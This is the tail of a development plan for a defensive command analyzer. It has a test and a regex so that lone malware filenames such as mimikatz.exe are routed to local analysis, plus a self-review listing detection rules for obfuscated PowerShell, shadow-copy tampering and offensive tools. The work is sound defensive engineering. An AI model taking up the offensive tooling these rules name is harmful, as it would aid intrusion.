```bash
git add shared/analyzer/extract.ts shared/analyzer/__tests__/extract.test.ts
git commit -m "fix(analyzer): stop extracting data-file names and .NET members as domain IOCs"
```

---

### Task 21: Close the lone-filename routing leak (data-boundary fix)

**Files:**
- Modify: `shared/intent.ts:98-111` (`looksLikeCommand`)
- Test: `shared/__tests__/intent.test.ts` (locate the existing intent test; append) — if none, create `shared/analyzer/__tests__/intent.test.ts` importing from `../../intent`.

**Interfaces:**
- Consumes: nothing new.
- Produces: a lone malware filename classifies as `command` (never `domain`), so `routeSelection` never sends it to `/api/enrich`.

- [ ] **Step 1: Write the failing test**

```typescript
import { describe, it, expect } from 'vitest'
import { classifyCockpitInput, routeSelection } from '../../intent'

describe('intent — lone malware filename never routes to enrich (review 2.7)', () => {
  it('classifies a bare mimikatz.exe as command, not indicator', () => {
    expect(classifyCockpitInput('mimikatz.exe')).toBe('command')
  })
  it('routeSelection never sends kernel32.dll to lookup', () => {
    expect(routeSelection('kernel32.dll').mode).not.toBe('lookup')
  })
  it('a real domain still classifies as indicator', () => {
    expect(classifyCockpitInput('evil.example.com')).toBe('indicator')
  })
})
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd web && npx vitest run ../shared/analyzer/__tests__/intent.test.ts` (or the located path)
Expected: FAIL — `mimikatz.exe` currently classifies as `indicator` (domain) and routes to lookup.

- [ ] **Step 3: Write minimal implementation**

Add a binary-filename guard to `looksLikeCommand` in `intent.ts` (before the final `return false`):

```typescript
  // A lone binary/script filename (mimikatz.exe, kernel32.dll) must never reach
  // /api/enrich as a bogus domain — treat it as command-shaped so the data
  // boundary sends it to the analyzer, not the third-party enrich endpoint.
  const LONE_BINARY_RE = /^[\w.-]+\.(?:exe|dll|sys|scr|ocx|cpl|vbs|ps1|hta|bat|cmd)$/i
  if (LONE_BINARY_RE.test(raw.trim())) return true
```

- [ ] **Step 4: Run test to verify it passes + full Phase-4 gate**

Run: `cd web && npx vitest run ../shared/analyzer/__tests__/intent.test.ts`
Then: `npm --prefix web run build && cd web && npx vitest run ../shared && npx vitest run src`
Expected: all green. Confirm no existing intent test regresses (a legitimate `finger.io`-style domain must still classify as indicator — the guard requires a binary extension, which `.io` is not).

- [ ] **Step 5: Commit + note-taking**

```bash
git add shared/intent.ts shared/analyzer/__tests__/intent.test.ts
git commit -m "fix(analyzer): route lone malware filenames to the analyzer, never to enrich"
```

Then invoke `nt` for a Phase-4 `docs/HANDOFF.md` block and a closing summary.

---

## Self-Review (completed by plan author)

**1. Spec coverage** — every spec section maps to tasks:
- §4.1 opaque-residue detector → Task 1–2; §4.2 notice → Task 3; §4.3 LOLBin gating → Task 4–5; §4.4 fixture → Task 6.
- §5 decode ladder → Task 7 (base64), 8 ([char]/join), 9 (-f), 10 (-replace), 11 (reversal). `-bxor` correctly deferred (§9).
- §6 T1490 → Task 12; disk-then-exec → Task 13; ClickFix gating → Task 14; offensive-tool → Task 15.
- §7 cmd reassembly → Task 16–17; debounce/size-cap → Task 18; bounded inflate → Task 19; extract hygiene → Task 20; intent leak → Task 21.
- §8 acceptance criteria are the phase-gate steps (6, 11, 15, 21). §9 out-of-scope items appear in no task (correct).

**2. Placeholder scan** — no TBD/TODO/"handle edge cases"; every code step carries real code.

**3. Type consistency** — `ResidueFinding` fields (`construct`/`note`/`bytes`/`entropy`) match Task 1 ↔ Task 2 consumption; `Match.vars` keys (`squiblydoo`, `name`) are set in `fires()` and read in `render()` within the same task; `reassembleCmdVars` return shape `{text,changed}` matches Task 16 ↔ 17; new rule ids (`shadow-recovery-tamper`, `disk-dropper`, `offensive-tool`, `cmd-var-obfuscation`) are referenced consistently between techniques.ts and bullets.ts tasks.

**One flagged risk for the executor:** Tasks 12 and 15 add `near-dispositive` rules — after each, run the full `characterization.test.ts` and adjust any snapshot that asserted "no characterization" for an input that now legitimately earns one (this is the ratchet working, not a regression). The 7-sample fixture (`review-samples.test.ts`) is the guard.
